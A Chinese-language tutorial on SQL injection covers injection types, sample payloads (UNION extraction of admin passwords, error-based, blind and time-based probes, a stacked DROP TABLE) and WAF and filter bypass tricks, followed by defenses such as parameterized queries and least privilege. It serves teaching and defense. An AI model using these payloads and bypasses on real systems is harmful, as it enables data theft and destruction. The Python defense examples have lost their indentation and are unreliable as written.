# SQL注入

## 1. SQL注入原理

### 1.1 基本概念

SQL注入是一种将恶意的SQL代码插入到应用的输入参数中，在后台SQL服务器上解析执行的攻击方式。

### 1.2 产生原因

- **用户输入未充分验证**

- **动态SQL拼接**

- **错误信息泄露**

- **权限设置不当**

### 1.3 攻击流程

```sql
输入恶意数据 → 拼接SQL语句 → 数据库执行 → 获取敏感信息/执行恶意操作
```

## 2. SQL注入分类

### 2.1 按注入位置分类

#### 2.1.1 数字型注入

```sql
-- 正常查询
SELECT * FROM users WHERE id = 1

-- 注入攻击
SELECT * FROM users WHERE id = 1 OR 1=1
```

#### 2.1.2 字符型注入

```sql
-- 正常查询
SELECT * FROM users WHERE name = 'admin'

-- 注入攻击
SELECT * FROM users WHERE name = 'admin' OR '1'='1'
```

#### 2.1.3 搜索型注入

```sql
-- 正常查询
SELECT * FROM products WHERE name LIKE '%apple%'

-- 注入攻击
SELECT * FROM products WHERE name LIKE '%apple%' OR 1=1-- %'
```

### 2.2 按攻击手法分类

#### 2.2.1 联合查询注入

```sql
UNION SELECT username, password FROM admin
```

#### 2.2.2 报错注入

```sql
AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

#### 2.2.3 布尔盲注

```sql
AND length(database())=1
AND substr(database(),1,1)='a'
```

#### 2.2.4 时间盲注

```sql
AND IF(1=1,SLEEP(5),0)
```

#### 2.2.5 堆叠查询

```sql
; DROP TABLE users --
```

## 3. 常见绕过技术

### 3.1 编码绕过

- URL编码

- 十六进制编码

- Unicode编码

- Base64编码

### 3.2 注释符绕过

```sql
-- 空格
/**/
#
--+
;%00
```

### 3.3 关键字过滤绕过

- 大小写混合：`SeLeCt`

- 双写关键字：`selselectect`

- 内联注释：`/*!SELECT*/`

- 特殊符号：`SEL%0bECT`

### 3.4 空格绕过

```sql
%09 %0a %0b %0c %0d %a0 /**/
```

### 3.5 引号绕过

- 使用十六进制：`0x61646D696E`

- 使用CHAR函数：`CHAR(97,100,109,105,110)`

### 3.6 WAF绕过技术

- 分块传输

- 协议层绕过

- 白名单绕过

- 参数污染

### 3.7 报错注入绕过

-过滤关键函数

    使用不常用报错函数+科学计数法占位拼接+反引号

    zcy_cgb.id=\`GTID_SUBSET\`520.e(SESSION_USER(520.e),1)

-拦截逗号+字母或者数字

    使用%0a占位，如\`extractvalue\`(1,\`concat_ws\`(0x0a,%0a0x0a,%0auser()))

-过滤括号

    使用rlike,如：1 rlike case when current_user like 0x7225 then 1 else 0x00 end

    使用regexp，如：1+regexp+case+when+current_user+like+0x7225+then+1+else+0x00+end

### 4.1 输入验证

```python
#白名单验证

def validate_input(input_str):
 import re
 if re.match(r'^[a-zA-Z0-9_]+$', input_str):
 return True
 return False
```

### 4.2 参数化查询（预编译语句）

```java
// Java示例
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

### 4.3 存储过程

```sql
CREATE PROCEDURE GetUser (@Username NVARCHAR(50))
AS
BEGIN
 SELECT * FROM users WHERE username = @Username
END
```

### 4.4 最小权限原则

```sql
-- 创建只读用户
CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.* TO 'webuser'@'localhost';
```

### 4.5 其他防御措施

#### 4.5.1 错误信息处理

- 生产环境关闭详细错误信息

- 使用自定义错误页面

#### 4.5.2 Web应用防火墙

- 部署WAF

- 配置安全规则

#### 4.5.3 安全编码规范

```python
#安全示例

import sqlite3

def safe_query(user_id):
 conn = sqlite3.connect('database.db')
 cursor = conn.cursor()
#使用参数化查询

cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
results = cursor.fetchall()

conn.close()
return results
```

#### 4.5.4 定期安全审计

- 代码审计

- 渗透测试

- 漏洞扫描

## 5. 检测工具

### 5.1 自动化工具

- **SQLmap** - 自动化SQL注入工具

- **Burp Suite** - Web漏洞扫描

- **Nessus** - 漏洞扫描器

### 5.2 手动检测方法

```sql
-- 基础检测
' OR 1=1 --
' AND 1=2 --
' UNION SELECT 1,2,3 --
```

## 6. 最佳实践总结

1. **永远不要信任用户输入**

2. **使用参数化查询**

3. **实施最小权限原则**

4. **定期更新和打补丁**

5. **进行安全培训**

6. **建立安全开发生命周期**

## 7. 应急响应

1. **立即隔离受影响的系统**

2. **分析日志确定攻击范围**

3. **修复漏洞**

4. **重置相关密码**

5. **通知相关用户**

6. **总结经验教训**

    